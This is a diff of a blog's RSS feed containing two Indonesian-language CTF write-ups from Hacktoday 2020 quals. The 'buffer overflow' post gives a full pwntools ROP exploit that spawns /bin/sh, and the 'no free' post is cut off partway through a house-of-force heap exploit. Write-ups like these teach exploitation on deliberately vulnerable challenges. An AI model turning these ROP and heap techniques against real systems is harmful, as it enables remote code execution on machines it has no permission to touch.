@@ -1,36 +1,847 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Posts on 💻📘🤸‍♂️💡</title>
-    <link>https://fikriguska.github.io/posts/</link>
-    <description>Recent content in Posts on 💻📘🤸‍♂️💡</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 17 Mar 2020 00:00:00 +0000</lastBuildDate>
+    <channel>
+        <title>Posts on Camelliose</title>
+        <link>https://fikriguska.github.io/posts/</link>
+        <description>Recent content in Posts on Camelliose</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Wed, 12 Aug 2020 00:40:58 +0700</lastBuildDate>
+        <atom:link href="https://fikriguska.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Hacktoday 2020 (Quals) - buffer overflow</title>
+            <link>https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-buffer-overflow/</link>
+            <pubDate>Wed, 12 Aug 2020 00:40:58 +0700</pubDate>
+            
+            <guid>https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-buffer-overflow/</guid>
+            <description>Overview Diberikan binary dengan proteksi sebagai berikut:
+Binary tersebut tersebut menampilkan tulisan &amp;ldquo;OK, I&amp;rsquo;ll give you buffer overflow&amp;rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { signed __int64 v4; // [rsp+0h] [rbp-50h]  int v5; // [rsp+8h] [rbp-48h]  int v6; // [rsp+Ch] [rbp-44h]  char buf[64]; // [rsp+10h] [rbp-40h]  __int64 savedregs; // [rsp+50h] [rbp+0h]  memset(buf, 0, sizeof(buf)); v5 = 0; init(&amp;amp;savedregs, argv, buf); strcpy(str, &amp;#34;OK, I&amp;#39;ll give you buffer overflow&amp;#34;); puts(str); v6 = read(0, buf, 0x3E8uLL); while ( v6 / 8 !</description>
+            <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
+<p>Diberikan binary dengan proteksi sebagai berikut:</p>
+<p><img src="/img/buffer-overflow-1.png" alt="image alt text"></p>
+<p>Binary tersebut tersebut menampilkan tulisan &ldquo;OK, I&rsquo;ll give you buffer overflow&rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi <code>main</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+0h] [rbp-50h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+8h] [rbp-48h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp+Ch] [rbp-44h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-40h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> savedregs; <span style="color:#75715e">// [rsp+50h] [rbp+0h]
+</span><span style="color:#75715e"></span>
+  memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  init(<span style="color:#f92672">&amp;</span>savedregs, argv, buf);
+  strcpy(str, <span style="color:#e6db74">&#34;OK, I&#39;ll give you buffer overflow&#34;</span>);
+  puts(str);
+  v6 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x3E8uLL</span>);
+  <span style="color:#66d9ef">while</span> ( v6 <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">!=</span> v5 )
+  {
+    v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> v5];
+    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">255</span> <span style="color:#f92672">&amp;&amp;</span> v4 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)maybe_you_need_this
+      <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)etext <span style="color:#f92672">&amp;&amp;</span> v4 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_bss_start
+      <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>end )
+    {
+      puts(<span style="color:#e6db74">&#34;restricted.&#34;</span>);
+      exit(<span style="color:#ae81ff">1</span>);
+    }
+    <span style="color:#f92672">++</span>v5;
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>binary tersebut juga disediakan gadget tambahan seperti pop rdx dan juga syscall.</p>
+<p>Terlihat beberapa pengecekan:</p>
+<ol>
+<li>v4 &gt; 255 &amp;&amp; v4 &lt; (signed __int64)maybe_you_need_this</li>
+<li>v4 &gt; (signed __int64)etext &amp;&amp; v4 &lt; (signed __int64)&amp;_bss_start</li>
+<li>v4 &gt; (signed __int64)&amp;end )</li>
+</ol>
+<p>Atau jika ditulis menggunakan alamat akan seperti:</p>
+<ol>
+<li>255 &lt; v4 &lt; 0x0000000004006B6</li>
+<li>0x000000000040090D &lt; v4 &lt; 0x0000000000601058</li>
+<li>v4 &gt; 0x0000000006010B0</li>
+</ol>
+<p>Itulah yang tidak boleh kita tulis setiap 8 byte pada array, dengan adanya pengecekan tersebut kita tidak bisa menulis PLT, GOT, dan libc address.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Sesuai nama soal, iya, buffer overflow wkwkw</p>
+<h2 id="exploit">Exploit</h2>
+<p>Exploit yang kita akan lakukan adalah memanggil execve(&quot;/bin/sh&rdquo;, 0, 0). Namun karena kita tidak bisa menulis /bin/sh, kita harus mencari cara agar lolos pengecekan. Caranya yaitu dengan memanggil fungsi <code>read</code> yang berada pada fungsi main (0x00000000004007E7). Untuk setup argumennya dapat dilakukan dengan menggunakan beberapa gadget yang lolos pengecekan yaitu pop rdi (0x00000000004008f3), pop rsi (0x00000000004008f1), dan pop rdx (0x00000000004006ba). Pada sebelum memanggil <code>read</code>, di payload kita tambahkan untuk mengubah base pointer ke bss (0x0000000006010a8) karena address diketahui dan juga lolos pengecekan. Kenapa base pointer diubah? karena kita akan memanggil <code>read</code> lagi untuk mengoverwrite rbp-0x48 (<code>v5</code>) yang merupakan counter pada saat pengecekan berlangsung dan akan diubah dengan nilai panjang string (payload) dibagi 8, supaya tidak ada pengecekan sama sekali dan kita dapat dengan mudah memasukkan string /bin/sh didalamnya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000006010a8</span>
+    read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000004007E7</span>
+    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f3</span>
+    pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f1</span>
+    pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006ba</span>
+    syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006bc</span>
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
+    payload <span style="color:#f92672">+=</span> p64(rbp)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x48</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">200</span>)
+    payload <span style="color:#f92672">+=</span> p64(read)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;flow</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</code></pre></div><p>berikut kondisi setelah payload dikirim dan tepat sebelum pemanggilan <code>read</code> kedua:</p>
+<pre><code>│0x0000000000601060│+0x0000   0x00007faada9a9620 &lt;- rbp - 0x48 (v5)
+│0x0000000000601068│+0x0008   0x0000000000000000   
+│0x0000000000601070│+0x0010   0x00007faada9a88e0   
+│0x0000000000601078│+0x0018   0x0000000000000000   
+│0x0000000000601080│+0x0020   0x6c6c2749202c4b4f   
+│0x0000000000601088│+0x0028   0x6f79206576696720   
+│0x0000000000601090│+0x0030   0x7265666675622075   
+│0x0000000000601098│+0x0038   0x6f6c667265766f20   
+│0x00000000006010a0│+0x0040   0x0000000000000077   
+│0x00000000006010a8│+0x0048   0x0000000000000000 &lt;- rbp 
+</code></pre><p>kita akan membuat payload yang mengoverwrite rbp-0x48 pada saat <code>read</code> kedua sekaligus setup untuk pemanggilan execve(&quot;/bin/sh&rdquo;, 0, 0). Tetapi bagaimana set nilai raxnya? Disini saya menyediakan suatu fungsi yang memiliki nilai keluaran yang mana hal tersebut bisa digunakan untuk setup nilai rax, yaitu fungsi <code>what</code>. Berikut hasil dekompilasinya:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">what</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">int</span> a2)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-4h]
+</span><span style="color:#75715e"></span>
+  v2 <span style="color:#f92672">=</span> a1;
+  <span style="color:#66d9ef">if</span> ( a2 <span style="color:#f92672">&gt;=</span> a1 )
+    v2 <span style="color:#f92672">=</span> a2;
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> v2; i <span style="color:#f92672">%</span> a1 <span style="color:#f92672">||</span> i <span style="color:#f92672">%</span> a2; <span style="color:#f92672">++</span>i )
+    ;
+  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i;
+}
+</code></pre></div><p>Hmm jika diteliti lagi itu merupakan fungsi KPK (Lho kok naronya fungsi KPK??? ya karena pengen wkwkwk). Jadi untuk memanggil execve kita harus set nilai rax menjadi 59, berarti kita harus setup argumen-argumen fungsi <code>what</code> menjadi 59 dan 1 atau 59 dan 59.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/sh&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;what&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(syscall)
+</code></pre></div><p>karena mengingat kita harus overwrite rbp-0x48 (<code>v5</code>), pada awal payload kita taruh panjang payload dibagi 8.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    counter <span style="color:#f92672">=</span> len(payload) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    payload <span style="color:#f92672">=</span> p64(counter) <span style="color:#f92672">+</span> payload
+    p<span style="color:#f92672">.</span>sendline(payload)
+</code></pre></div><p>setelah payload dikirim akan menjadi:</p>
+<pre><code>│0x0000000000601060│+0x0000   0x0000000000000018 &lt;- rbp-0x48 (v5)
+│0x0000000000601068│+0x0008   0x0068732f6e69622f (&quot;/bin/sh&quot;)
+│0x0000000000601070│+0x0010   0x0000000000000000   
+│0x0000000000601078│+0x0018   0x0000000000000000   
+│0x0000000000601080│+0x0020   0x0000000000000000   
+│0x0000000000601088│+0x0028   0x0000000000000000   
+│0x0000000000601090│+0x0030   0x0000000000000000   
+│0x0000000000601098│+0x0038   0x0000000000000000   
+│0x00000000006010a0│+0x0040   0x0000000000000000   
+│0x00000000006010a8│+0x0048   0x0000000000000000 &lt;- rbp
+</code></pre><p>nilai 0x18 akan sama dengan panjang payload dibagi 8, dan <code>while ( v6 / 8 != v5 )</code> akan bernilai false yang artinya tidak akan ada pengecekan sama sekali. Dengan begitu ropchain untuk pemanggilan execve(&quot;/bin/sh&rdquo;, 0, 0) akan sukses.</p>
+<h2 id="full-exploit-code">Full Exploit Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc chall.codepwnda.id 17013&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+    con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+    PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+<span style="color:#75715e"># context.terminal = &#39;gnome-terminal -e&#39;.split()</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tmux splitw -h -p 70&#39;</span><span style="color:#f92672">.</span>split()
+<span style="color:#75715e">#context.log_level = &#39;DEBUG&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+
+    rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000006010a8</span>
+    read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000004007E7</span>
+    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f3</span>
+    pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f1</span>
+    pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006ba</span>
+    syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006bc</span>
     
-	<atom:link href="https://fikriguska.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
+    payload <span style="color:#f92672">+=</span> p64(rbp)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x48</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">200</span>)
+    payload <span style="color:#f92672">+=</span> p64(read)
     
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;flow</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/sh&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;what&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(syscall)
     
-    <item>
-      <title>UNITY 2020 - Babystack</title>
-      <link>https://fikriguska.github.io/posts/unity2020-babystack/</link>
-      <pubDate>Tue, 17 Mar 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://fikriguska.github.io/posts/unity2020-babystack/</guid>
-      <description>hint:
+    counter <span style="color:#f92672">=</span> len(payload) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    payload <span style="color:#f92672">=</span> p64(counter) <span style="color:#f92672">+</span> payload
+
+    p<span style="color:#f92672">.</span>sendline(payload)
+
+    p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+            p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+            gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><p><img src="/img/buffer-overflow-2.png" alt="image alt text"></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hacktoday 2020 (Quals) - no free</title>
+            <link>https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/</link>
+            <pubDate>Tue, 11 Aug 2020 22:16:58 +0700</pubDate>
+            
+            <guid>https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/</guid>
+            <description>overview Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.
+Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.
+Vulnerability Vulnerability terletak pada fungsi edit, berikut baris yang vuln:
+LOBYTE(nbytes) = *(_DWORD *)list[2 * v4]; hanya 1 byte nbytes pertama yang diassign pada baris diatas.</description>
+            <content type="html"><![CDATA[<h2 id="overview">overview</h2>
+<p>Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.</p>
+<p><img src="/img/nofree-2.png" alt="image alt text"></p>
+<p>Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Vulnerability terletak pada fungsi <code>edit</code>, berikut baris yang vuln:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">LOBYTE(nbytes) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)list[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v4];
+</code></pre></div><p>hanya 1 byte <code>nbytes</code> pertama yang diassign pada baris diatas. Jadi jika kita bisa mewrite sisa 3 bytenya sebelum baris diatas, maka <code>nbytes</code> akan memiliki size yang besar karena <code>nbytes</code> memiliki 4 byte bukan 1 byte. Tetapi sebenarnya terdapat vulnerability lain yaitu pada fungsi <code>create</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( nbytes <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">255</span> )
+{
+    puts(<span style="color:#e6db74">&#34;Size Error&#34;</span>);
+    exit(<span style="color:#ae81ff">1</span>);
+}
+</code></pre></div><p><code>nbytes</code> bertipe int lalu bisa diisi dengan negatif dan lolos pengecekan, dan ketika input nama pada fungsi <code>input_str</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">input_str</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t nbytes)
+{
+  ssize_t v3; <span style="color:#75715e">// [esp+Ch] [ebp-Ch]
+</span><span style="color:#75715e"></span>
+  v3 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, buf, nbytes);
+  <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+  {
+    puts(<span style="color:#e6db74">&#34;something wrong:/&#34;</span>);
+    exit(<span style="color:#ae81ff">1</span>);
+  }
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)buf <span style="color:#f92672">+</span> v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
+    <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)buf <span style="color:#f92672">+</span> v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">return</span> v3;
+}
+</code></pre></div><p>ya, <code>nbytes</code> pada fungsi <code>input_str</code> bertipe size_t (mirip dengan unsigned int, tidak bisa negatif). Jadi jika name size dimasukkan dengan -1 maka akan bisa read string sebanyak 0xFFFFFFFF. Sebenarnya saya tidak menyadari vuln ini wkwkw karena pada saat pembuatan soal saya menggunakan int pada fungsi <code>input_str</code>. Namun pada salah satu write up yang diterima, ada yang memanfaatkan vuln ini untuk solve soal walaupun telat submit beberapa detik saja. So, untuk siapa pun yang menemukan vuln ini, nice!</p>
+<h2 id="exploit">Exploit</h2>
+<p>OK, jika menggunakan vuln <code>nbytes</code> yang diisi dengan satu byte saja, bagaimana cara untuk membuat nilainya menjadi besar? Kita bisa set 3 byte sisanya dengan memanfaatkan “nilai sampah” atau nilai yang sudah tidak digunakan lagi dari stack frame fungsi sebelumnya yaitu fungsi edit profile. Jika kita mengubah username, pada offset ke 29 akan mulai mengoverwrite tempat <code>nbytes</code> berada apabila fungsi edit dipanggil. Dengan write offset ke 30, itu sudah cukup untuk mengubah size input name agar bisa mengoverwrite top chunk  dengan nilai yang sangat besar seperti 0xFFFFFFFF. Ini dilakukan untuk bisa melakukan house of force pada heap (<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c)">https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c)</a>.</p>
+<p>contoh nilai <code>nbytes</code> sebelum diassign satu byte pertama:</p>
+<p><img src="/img/nofree-3.png" alt="image alt text"></p>
+<p>sedudah:</p>
+<p><img src="/img/nofree-4.png" alt="image alt text"></p>
+<p>ketika menggunakan fungsi <code>input_str</code>, maka fungsi tersebut akan menggunakan keseluruhan byte yaitu bisa mengambil string sebanyak 0x6120 karakter, boom.</p>
+<p>Namun sebelum kita melakukan house of force, kita perlu mengetahui address dari target dan top chunk itu sendiri. Untuk leak heap address kita harus mengubah size input dengan cara yang tadi terlebih dahulu, yaitu write offset ke 30 pada edit username. Setelah itu edit note dengan name sebanyak 256 tanpa newline, ketika note diview, address heap akan terleak.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;username: &#39;</span>, <span style="color:#e6db74">&#39;camelliose&#39;</span>)
+    add(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    edit_profile(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">30</span>)
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">255</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;@&#39;</span>)
+    heap_base <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>
+    top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x180</span>
+</code></pre></div><p>Setelah itu kita write top chunk size dengan 0xFFFFFFFF</p>
